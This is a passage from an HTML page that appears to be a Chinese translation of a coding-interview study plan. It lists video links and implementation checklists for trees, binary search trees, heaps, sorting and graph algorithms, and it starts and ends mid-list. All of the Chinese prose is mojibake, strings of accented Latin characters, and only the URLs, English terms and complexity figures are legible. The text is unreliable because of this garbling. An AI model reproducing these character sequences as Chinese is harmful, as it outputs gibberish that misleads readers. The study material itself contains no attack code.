‘ â€”â€” ç¬”è®° &amp; èƒŒæ™¯</span></h3><ul><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/95qda/trees">ç³»åˆ—ï¼šæ ‘ï¼ˆè§†é¢‘ï¼‰</a></li><li>åŸºæœ¬çš„æ ‘å½¢ç»“æ„</li><li>éå†</li><li>æ“ä½œç®—æ³•</li><li>[ ] <a href="https://www.youtube.com/watch?v=uWL6FJhq5fM">BFSï¼ˆå¹¿åº¦ä¼˜å…ˆæ£€ç´¢ï¼Œbreadth-first searchï¼‰å’Œ DFSï¼ˆæ·±åº¦ä¼˜å…ˆæ£€ç´¢ï¼Œdepth-first searchï¼‰</a><ul><li>BFS ç¬”è®°<ul><li>å±‚åºéå†ï¼ˆä½¿ç”¨é˜Ÿåˆ—çš„ BFS ç®—æ³•ï¼‰</li><li>æ—¶é—´å¤æ‚åº¦ï¼š O(n)</li><li>ç©ºé—´å¤æ‚åº¦ï¼š<ul><li>æœ€å¥½æƒ…å†µï¼šO(1)</li><li>æœ€åæƒ…å†µï¼šO(n/2)=O(n)</li></ul></li></ul></li><li>DFS ç¬”è®°ï¼š<ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(n)</li><li>ç©ºé—´å¤æ‚åº¦ï¼š<ul><li>æœ€å¥½æƒ…å†µï¼šO(log n) - æ ‘çš„å¹³å‡é«˜åº¦</li><li>æœ€åæƒ…å†µï¼šO(n)</li></ul></li><li>ä¸­åºéå†ï¼ˆDFSï¼šå·¦ã€èŠ‚ç‚¹æœ¬èº«ã€å³ï¼‰</li><li>ååºéå†ï¼ˆDFSï¼šå·¦ã€å³ã€èŠ‚ç‚¹æœ¬èº«ï¼‰</li><li>å…ˆåºéå†ï¼ˆDFSï¼šèŠ‚ç‚¹æœ¬èº«ã€å·¦ã€å³ï¼‰</li></ul></li></ul></li></ul></li><li><h3><span id="er-cha-cha-zhao-shu-binary-search-trees-bsts">äºŒå‰æŸ¥æ‰¾æ ‘ï¼ˆBinary search treesï¼‰ï¼šBSTs</span></h3><ul><li>[ ] <a href="https://www.youtube.com/watch?v=x6At0nzX92o&amp;index=1&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6">äºŒå‰æŸ¥æ‰¾æ ‘æ¦‚è§ˆï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/p82sw/core-introduction-to-binary-search-trees">ç³»åˆ—ï¼ˆè§†é¢‘ï¼‰</a><ul><li>ä»ç¬¦å·è¡¨å¼€å§‹åˆ° BST ç¨‹åº</li></ul></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/E7cXP/introduction">ä»‹ç»ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=9Jry5-82I68">MITï¼ˆè§†é¢‘ï¼‰</a></li><li>C/C++:<ul><li>[ ] <a href="https://www.youtube.com/watch?v=COZK7NATh4k&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P&amp;index=28">äºŒå‰æŸ¥æ‰¾æ ‘ â€”â€” åœ¨ C/C++ ä¸­å®ç°ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=hWokyBoo0aI&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P&amp;index=29">BST çš„å®ç° â€”â€” åœ¨å †æ ˆå’Œå †ä¸­çš„å†…å­˜åˆ†é…ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=Ut90klNN264&amp;index=30&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P">åœ¨äºŒå‰æŸ¥æ‰¾æ ‘ä¸­æ‰¾åˆ°æœ€å°å’Œæœ€å¤§çš„å…ƒç´ ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=_pnqMz5nrRs&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P&amp;index=31">å¯»æ‰¾äºŒå‰æ ‘çš„é«˜åº¦ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=9RHO6jU--GU&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P&amp;index=32">äºŒå‰æ ‘çš„éå† â€”â€” å¹¿åº¦ä¼˜å…ˆå’Œæ·±åº¦ä¼˜å…ˆç­–ç•¥ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=86g8jAQug04&amp;index=33&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P">äºŒå‰æ ‘ï¼šå±‚åºéå†ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=gm8DUJJhmY4&amp;index=34&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P">äºŒå‰æ ‘çš„éå†ï¼šå…ˆåºã€ä¸­åºã€ååºï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=yEwSGhSsT0U&amp;index=35&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P">åˆ¤æ–­ä¸€æ£µäºŒå‰æ ‘æ˜¯å¦ä¸ºäºŒå‰æŸ¥æ‰¾æ ‘ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=gcULXE7ViZw&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P&amp;index=36">ä»äºŒå‰æŸ¥æ‰¾æ ‘ä¸­åˆ é™¤ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=5cPbNCrdotA&amp;index=37&amp;list=PL2_aWCzGMAwI3W_JlcBbtYTwiQSsOTa6P">äºŒå‰æŸ¥æ‰¾æ ‘ä¸­åºéå†çš„åç»§è€…ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li>[ ] å®ç°ï¼š<ul><li>[ ] insert    // å¾€æ ‘ä¸Šæ’å€¼</li><li>[ ] get_node_count // æŸ¥æ‰¾æ ‘ä¸Šçš„èŠ‚ç‚¹æ•°</li><li>[ ] print_values // ä»å°åˆ°å¤§æ‰“å°æ ‘ä¸­èŠ‚ç‚¹çš„å€¼</li><li>[ ] delete_tree</li><li>[ ] is_in_tree // å¦‚æœå€¼å­˜åœ¨äºæ ‘ä¸­åˆ™è¿”å› true</li><li>[ ] get_height // è¿”å›èŠ‚ç‚¹æ‰€åœ¨çš„é«˜åº¦ï¼ˆå¦‚æœåªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œé‚£ä¹ˆé«˜åº¦åˆ™ä¸º1ï¼‰</li><li>[ ] get_min   // è¿”å›æ ‘ä¸Šçš„æœ€å°å€¼</li><li>[ ] get_max   // è¿”å›æ ‘ä¸Šçš„æœ€å¤§å€¼</li><li>[ ] is_binary_search_tree</li><li>[ ] delete_value</li><li>[ ] get_successor // è¿”å›ç»™å®šå€¼çš„åç»§è€…ï¼Œè‹¥æ²¡æœ‰åˆ™è¿”å›-1</li></ul></li></ul></li><li><h3><span id="dui-heap-you-xian-ji-dui-lie-priority-queue-er-cha-dui-binary-heap">å †ï¼ˆHeapï¼‰ / ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼ˆPriority Queueï¼‰ / äºŒå‰å †ï¼ˆBinary Heapï¼‰</span></h3><ul><li>å¯è§†åŒ–æ˜¯ä¸€æ£µæ ‘ï¼Œä½†é€šå¸¸æ˜¯ä»¥çº¿æ€§çš„å½¢å¼å­˜å‚¨ï¼ˆæ•°ç»„ã€é“¾è¡¨ï¼‰</li><li>[ ] <a href="https://en.wikipedia.org/wiki/Heap_(data_structure)">å †</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/2OpTs/introduction">ä»‹ç»ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/z3l9N/naive-implementations">ç®€å•çš„å®ç°ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/GRV2q/binary-trees">äºŒå‰æ ‘ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/supplement/S5xxz/tree-height-remark">å…³äºæ ‘é«˜çš„è®¨è®ºï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/0g1dl/basic-operations">åŸºæœ¬æ“ä½œï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/gl5Ni/complete-binary-trees">å®Œå…¨äºŒå‰æ ‘ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/HxQo9/pseudocode">ä¼ªä»£ç ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://youtu.be/odNJmw5TOEE?list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;t=3291">å †æ’åº â€”â€” è·³åˆ°èµ·ç‚¹ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/hSzMO/heap-sort">å †æ’åºï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/dwrOS/building-a-heap">æ„å»ºä¸€ä¸ªå †ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=B7hVxCmfPtM&amp;index=4&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">MITï¼šå †ä¸å †æ’åºï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=yIUFT6AKBGE&amp;index=24&amp;list=PL4BBB74C7D2A1049C">CS 61B Lecture 24ï¼šä¼˜å…ˆçº§é˜Ÿåˆ—ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=MiyLo8adrWw">æ„å»ºçº¿æ€§æ—¶é—´å¤æ‚åº¦çš„å †ï¼ˆå¤§é¡¶å †ï¼‰</a></li><li>[ ] å®ç°ä¸€ä¸ªå¤§é¡¶å †ï¼š<ul><li>[ ] insert</li><li>[ ] sift_up â€”â€” ç”¨äºæ’å…¥å…ƒç´ </li><li>[ ] get_max â€”â€” è¿”å›æœ€å¤§å€¼ä½†ä¸ç§»é™¤å…ƒç´ </li><li>[ ] get_size() â€”â€” è¿”å›å­˜å‚¨çš„å…ƒç´ æ•°é‡</li><li>[ ] is_empty() â€”â€” è‹¥å †ä¸ºç©ºåˆ™è¿”å› true</li><li>[ ] extract_max â€”â€” è¿”å›æœ€å¤§å€¼å¹¶ç§»é™¤</li><li>[ ] sift_down â€”â€” ç”¨äºè·å–æœ€å¤§å€¼å…ƒç´ </li><li>[ ] remove(i) â€”â€” åˆ é™¤æŒ‡å®šç´¢å¼•çš„å…ƒç´ </li><li>[ ] heapify â€”â€” æ„å»ºå †ï¼Œç”¨äºå †æ’åº</li><li>[ ] heap_sort() â€”â€” æ‹¿åˆ°ä¸€ä¸ªæœªæ’åºçš„æ•°ç»„ï¼Œç„¶åä½¿ç”¨å¤§é¡¶å †æˆ–è€…å°é¡¶å †è¿›è¡Œå°±åœ°æ’åº</li></ul></li></ul></li></ul><h2><span id="pai-xu-sorting">æ’åºï¼ˆSortingï¼‰</span></h2><ul><li><p>[ ] ç¬”è®°:</p><ul><li>å®ç°å„ç§æ’åºï¼ŒçŸ¥é“æ¯ç§æ’åºçš„æœ€åã€æœ€å¥½å’Œå¹³å‡çš„å¤æ‚åº¦åˆ†åˆ«æ˜¯ä»€ä¹ˆåœºæ™¯:<ul><li>ä¸è¦ç”¨å†’æ³¡æ’åº - æ•ˆç‡å¤ªå·® - æ—¶é—´å¤æ‚åº¦ O(n^2), é™¤é n &lt;= 16</li></ul></li><li>[ ] æ’åºç®—æ³•çš„ç¨³å®šæ€§ (â€œå¿«æ’æ˜¯ç¨³å®šçš„ä¹ˆ?â€)<ul><li><a href="https://en.wikipedia.org/wiki/Sorting_algorithm#Stability">æ’åºç®—æ³•çš„ç¨³å®šæ€§</a></li><li><a href="http://stackoverflow.com/questions/1517793/stability-in-sorting-algorithms">æ’åºç®—æ³•çš„ç¨³å®šæ€§</a></li><li><a href="http://www.geeksforgeeks.org/stability-in-sorting-algorithms/">æ’åºç®—æ³•çš„ç¨³å®šæ€§</a></li><li><a href="http://homepages.math.uic.edu/~leon/cs-mcs401-s08/handouts/stability.pdf">æ’åºç®—æ³• - ç¨³å®šæ€§</a></li></ul></li><li>[ ] å“ªç§æ’åºç®—æ³•å¯ä»¥ç”¨é“¾è¡¨ï¼Ÿå“ªç§ç”¨æ•°ç»„ï¼Ÿå“ªç§ä¸¤è€…éƒ½å¯ï¼Ÿ<ul><li>å¹¶ä¸æ¨èå¯¹ä¸€ä¸ªé“¾è¡¨æ’åºï¼Œä½†å½’å¹¶æ’åºæ˜¯å¯è¡Œçš„.</li><li><a href="http://www.geeksforgeeks.org/merge-sort-for-linked-list/">é“¾è¡¨çš„å½’å¹¶æ’åº</a></li></ul></li></ul></li><li><p>å…³äºå †æ’åºï¼Œè¯·æŸ¥çœ‹å‰æ–‡å †çš„æ•°æ®ç»“æ„éƒ¨åˆ†ã€‚å †æ’åºå¾ˆå¼ºå¤§ï¼Œä¸è¿‡æ˜¯éç¨³å®šæ’åºã€‚</p></li><li><p>[ ] <a href="https://www.coursera.org/learn/algorithms-part1/home/week/3">Sedgewick â”€â”€ å½’å¹¶æ’åºï¼ˆ5ä¸ªè§†é¢‘ï¼‰</a></p><ul><li>[ ] 1. å½’å¹¶æ’åº</li><li>[ ] 2. è‡ªä¸‹è€Œä¸Šçš„å½’å¹¶æ’åº</li><li>[ ] 3. æ’åºå¤æ‚åº¦</li><li>[ ] 4. æ¯”è¾ƒå™¨</li><li>[ ] 5. ç¨³å®šæ€§</li></ul></li><li><p>[ ] <a href="https://www.coursera.org/learn/algorithms-part1/home/week/3">Sedgewick â”€â”€ å¿«é€Ÿæ’åºï¼ˆ4ä¸ªè§†é¢‘ï¼‰</a></p><ul><li>[ ] 1. å¿«é€Ÿæ’åº</li><li>[ ] 2. é€‰æ‹©</li><li>[ ] 3. é‡å¤é”®å€¼</li><li>[ ] 4. ç³»ç»Ÿæ’åº</li></ul></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=P00xJgWzz2c&amp;index=1&amp;list=PL89B61F78B552C1AB">å†’æ³¡æ’åºï¼ˆè§†é¢‘ï¼‰</a></p></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=ni_zk257Nqo&amp;index=7&amp;list=PL89B61F78B552C1AB">å†’æ³¡æ’åºåˆ†æï¼ˆè§†é¢‘ï¼‰</a></p></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=Kg4bqzAqRBM&amp;index=3&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">æ’å…¥æ’åº &amp; å½’å¹¶æ’åºï¼ˆè§†é¢‘ï¼‰</a></p></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=c4BRHC7kTaQ&amp;index=2&amp;list=PL89B61F78B552C1AB">æ’å…¥æ’åºï¼ˆè§†é¢‘ï¼‰</a></p></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=GCae1WNvnZM&amp;index=3&amp;list=PL89B61F78B552C1AB">å½’å¹¶æ’åºï¼ˆè§†é¢‘ï¼‰</a></p></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=y_G9BkAm6B8&amp;index=4&amp;list=PL89B61F78B552C1AB">å¿«æ’ï¼ˆè§†é¢‘ï¼‰</a></p></li><li><p>[ ] <a href="https://www.youtube.com/watch?v=6nDMgr0-Yyo&amp;index=8&amp;list=PL89B61F78B552C1AB">é€‰æ‹©æ’åºï¼ˆè§†é¢‘ï¼‰</a></p></li><li><p>[ ] å½’å¹¶æ’åºä»£ç ï¼š</p><ul><li>[ ] <a href="http://www.cs.yale.edu/homes/aspnes/classes/223/examples/sorting/mergesort.c">ä½¿ç”¨å¤–éƒ¨æ•°ç»„ï¼ˆCè¯­è¨€ï¼‰</a></li><li>[ ] <a href="https://github.com/jwasham/practice-python/blob/master/merge_sort/merge_sort.py">ä½¿ç”¨å¤–éƒ¨æ•°ç»„ï¼ˆPythonè¯­è¨€ï¼‰</a></li><li>[ ] <a href="https://github.com/jwasham/practice-cpp/blob/master/merge_sort/merge_sort.cc">å¯¹åŸæ•°ç»„ç›´æ¥æ’åºï¼ˆC++ï¼‰</a></li></ul></li><li><p>[ ] å¿«é€Ÿæ’åºä»£ç ï¼š</p><ul><li>[ ] <a href="http://www.cs.yale.edu/homes/aspnes/classes/223/examples/randomization/quick.c">å®ç°ï¼ˆCè¯­è¨€ï¼‰</a></li><li>[ ] <a href="https://github.com/jwasham/practice-c/blob/master/quick_sort/quick_sort.c">å®ç°ï¼ˆCè¯­è¨€ï¼‰</a></li><li>[ ] <a href="https://github.com/jwasham/practice-python/blob/master/quick_sort/quick_sort.py">å®ç°ï¼ˆPythonè¯­è¨€ï¼‰</a></li></ul></li><li><p>[ ] å®ç°:</p><ul><li>[ ] å½’å¹¶ï¼šå¹³å‡å’Œæœ€å·®æƒ…å†µçš„æ—¶é—´å¤æ‚åº¦ä¸º O(n log n)ã€‚</li><li>[ ] å¿«æ’ï¼šå¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º O(n log n)ã€‚</li><li>é€‰æ‹©æ’åºå’Œæ’å…¥æ’åºçš„æœ€åã€å¹³å‡æ—¶é—´å¤æ‚åº¦éƒ½æ˜¯ O(n^2)ã€‚</li><li>å…³äºå †æ’åºï¼Œè¯·æŸ¥çœ‹å‰æ–‡å †çš„æ•°æ®ç»“æ„éƒ¨åˆ†ã€‚</li></ul></li><li><p>[ ] æœ‰å…´è¶£çš„è¯ï¼Œè¿˜æœ‰ä¸€äº›è¡¥å……ï¼Œä½†å¹¶ä¸æ˜¯å¿…é¡»çš„:</p><ul><li><a href="https://www.coursera.org/learn/algorithms-part2/home/week/3">Sedgewickâ”€â”€åŸºæ•°æ’åº (6ä¸ªè§†é¢‘)</a><ul><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/vGHvb/strings-in-java">1. Java ä¸­çš„å­—ç¬¦ä¸²</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/2pi1Z/key-indexed-counting">2. é”®å€¼ç´¢å¼•è®¡æ•°ï¼ˆKey Indexed Countingï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/c1U7L/lsd-radix-sort">3. Least Significant Digit First String Radix Sort</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/gFxwG/msd-radix-sort">4. Most Significant Digit First String Radix Sort</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/crkd5/3-way-radix-quicksort">5. 3ä¸­åŸºæ•°å¿«é€Ÿæ’åº</a></li><li>[ ] <a href="https://www.coursera.org/learn/algorithms-part2/lecture/TH18W/suffix-arrays">6. åç»§æ•°ç»„ï¼ˆSuffix Arraysï¼‰</a></li></ul></li><li>[ ] <a href="http://www.cs.yale.edu/homes/aspnes/classes/223/notes.html#radixSort">åŸºæ•°æ’åº</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=xhr26ia4k38">åŸºæ•°æ’åºï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=Nz1KZXbghj8&amp;index=7&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">åŸºæ•°æ’åº, è®¡æ•°æ’åº (çº¿æ€§æ—¶é—´å†…)ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=cNB2lADK3_s&amp;index=8&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">éšæœºç®—æ³•: çŸ©é˜µç›¸ä¹˜, å¿«æ’, Freivaldsâ€™ ç®—æ³•ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=pOKy3RZbSws&amp;list=PLUl4u3cNGP61hsJNdULdudlRL493b-XZf&amp;index=14">çº¿æ€§æ—¶é—´å†…çš„æ’åºï¼ˆè§†é¢‘ï¼‰</a></li></ul></li></ul><p>æ€»ç»“ä¸€ä¸‹ï¼Œè¿™æ˜¯<a href="https://www.youtube.com/watch?v=kPRA0W1kECg">15ç§æ’åºç®—æ³•</a>çš„å¯è§†åŒ–è¡¨ç¤ºã€‚å¦‚æœä½ éœ€è¦æœ‰å…³æ­¤ä¸»é¢˜çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…â€œ<a href="#%E4%B8%80%E4%BA%9B%E4%B8%BB%E9%A2%98%E7%9A%84%E9%A2%9D%E5%A4%96%E5%86%85%E5%AE%B9">ä¸€äº›ä¸»é¢˜çš„é¢å¤–å†…å®¹</a>â€ä¸­çš„â€œæ’åºâ€éƒ¨åˆ†ã€‚</p><h2><span id="tu-graphs">å›¾ï¼ˆGraphsï¼‰</span></h2><p>å›¾è®ºèƒ½è§£å†³è®¡ç®—æœºç§‘å­¦é‡Œçš„å¾ˆå¤šé—®é¢˜ï¼Œæ‰€ä»¥è¿™ä¸€èŠ‚ä¼šæ¯”è¾ƒé•¿ï¼Œåƒæ ‘å’Œæ’åºçš„éƒ¨åˆ†ä¸€æ ·ã€‚</p><ul><li><p>ç¬”è®°:</p><ul><li>æœ‰4ç§åŸºæœ¬æ–¹å¼åœ¨å†…å­˜é‡Œè¡¨ç¤ºä¸€ä¸ªå›¾:<ul><li>å¯¹è±¡å’ŒæŒ‡é’ˆ</li><li>é‚»æ¥çŸ©é˜µ</li><li>é‚»æ¥è¡¨</li><li>é‚»æ¥å›¾</li></ul></li><li>ç†Ÿæ‚‰ä»¥ä¸Šæ¯ä¸€ç§å›¾çš„è¡¨ç¤ºæ³•ï¼Œå¹¶äº†è§£å„è‡ªçš„ä¼˜ç¼ºç‚¹</li><li>å¹¿åº¦ä¼˜å…ˆæœç´¢å’Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼šçŸ¥é“å®ƒä»¬çš„è®¡ç®—å¤æ‚åº¦å’Œè®¾è®¡ä¸Šçš„æƒè¡¡ä»¥åŠå¦‚ä½•ç”¨ä»£ç å®ç°å®ƒä»¬</li><li>é‡åˆ°ä¸€ä¸ªé—®é¢˜æ—¶ï¼Œé¦–å…ˆå°è¯•åŸºäºå›¾çš„è§£å†³æ–¹æ¡ˆï¼Œå¦‚æœæ²¡æœ‰å†å»å°è¯•å…¶ä»–çš„ã€‚</li></ul></li><li><p>MITï¼ˆè§†é¢‘ï¼‰ï¼š</p><ul><li><a href="https://www.youtube.com/watch?v=s-CYnVz-uh4&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=13">å¹¿åº¦ä¼˜å…ˆæœç´¢</a></li><li><a href="https://www.youtube.com/watch?v=AfSk24UTFS8&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=14">æ·±åº¦ä¼˜å…ˆæœç´¢</a></li></ul></li><li><p>[ ] Skiena æ•™æˆçš„è¯¾ç¨‹ - å¾ˆä¸é”™çš„ä»‹ç»:</p><ul><li>[ ] <a href="https://www.youtube.com/watch?v=OiXxhDrFruw&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;index=11">CSE373 2012 - è¯¾ç¨‹ 11 - å›¾çš„æ•°æ®ç»“æ„ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=g5vF8jscteo&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;index=12">CSE373 2012 - è¯¾ç¨‹ 12 - å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=S23W6eTcqdY&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;index=13">CSE373 2012 - è¯¾ç¨‹ 13 - å›¾çš„ç®—æ³•ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=WitPBKGV0HY&amp;index=14&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">CSE373 2012 - è¯¾ç¨‹ 14 - å›¾çš„ç®—æ³• (1)ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ia1L30l7OIg&amp;index=15&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">CSE373 2012 - è¯¾ç¨‹ 15 - å›¾çš„ç®—æ³• (2)ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=jgDOQq6iWy8&amp;index=16&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">CSE373 2012 - è¯¾ç¨‹ 16 - å›¾çš„ç®—æ³• (3)ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><p>[ ] å›¾ (å¤ä¹ å’Œå…¶ä»–):</p><ul><li>[ ] <a href="https://www.youtube.com/watch?v=Aa2sqUhIn-E&amp;index=15&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">6.006 å•æºæœ€çŸ­è·¯å¾„é—®é¢˜ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=2E7MmKv0Y24&amp;index=16&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">6.006 Dijkstra ç®—æ³•ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ozsuci5pIso&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=17">6.006 Bellman-Ford ç®—æ³•ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=CHvQ3q_gJ7E&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=18">6.006 Dijkstra æ•ˆç‡ä¼˜åŒ–ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=i_AQT_XfvD8&amp;index=6&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm">Aduni: å›¾çš„ç®—æ³• I - æ‹“æ‰‘æ’åºï¼Œæœ€å°ç”Ÿæˆæ ‘ï¼ŒPrim ç®—æ³• - ç¬¬å…­è¯¾ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ufj5_bppBsA&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=7">Aduni: å›¾çš„ç®—æ³• II - æ·±åº¦ä¼˜å…ˆæœç´¢, å¹¿åº¦ä¼˜å…ˆæœç´¢, Kruskal ç®—æ³•, å¹¶æŸ¥é›†æ•°æ®ç»“æ„ - ç¬¬ä¸ƒè¯¾ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=DiedsPsMKXc&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=8">Aduni: å›¾çš„ç®—æ³• III: æœ€çŸ­è·¯å¾„ - ç¬¬å…«è¯¾ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=XIAQRlNkJAw&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=9">Aduni: å›¾çš„ç®—æ³•. IV: å‡ ä½•ç®—æ³•ä»‹ç» - ç¬¬ä¹è¯¾ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <del><a href="https://youtu.be/dgjX4HdMI-Q?list=PL-XXv-cvA_iAlnI-BQr9hjqADPBtujFJd&amp;t=3489">CS 61B 2014 (ä» 58:09 å¼€å§‹)ï¼ˆè§†é¢‘ï¼‰</a></del></li><li>[ ] <a href="https://www.youtube.com/watch?v=aJjlQCFwylA&amp;list=PL-XXv-cvA_iAlnI-BQr9hjqADPBtujFJd&amp;index=19">CS 61B 2014: åŠ æƒå›¾ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=tKwnms5iRBU&amp;index=16&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">è´ªå¿ƒç®—æ³•: æœ€å°ç”Ÿæˆæ ‘ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=RpgcYiky7uw">å›¾çš„ç®—æ³•ä¹‹å¼ºè¿é€šåˆ†é‡ Kosaraju ç®—æ³•ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><p>å®Œæ•´çš„ Coursera è¯¾ç¨‹:</p><ul><li>[ ] <a href="https://www.coursera.org/learn/algorithms-on-graphs/home/welcome">å›¾çš„ç®—æ³•ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><p>æˆ‘ä¼šå®ç°:</p><ul><li>[ ] DFS é‚»æ¥è¡¨ (é€’å½’)</li><li>[ ] DFS é‚»æ¥è¡¨ (æ ˆè¿­ä»£)</li><li>[ ] 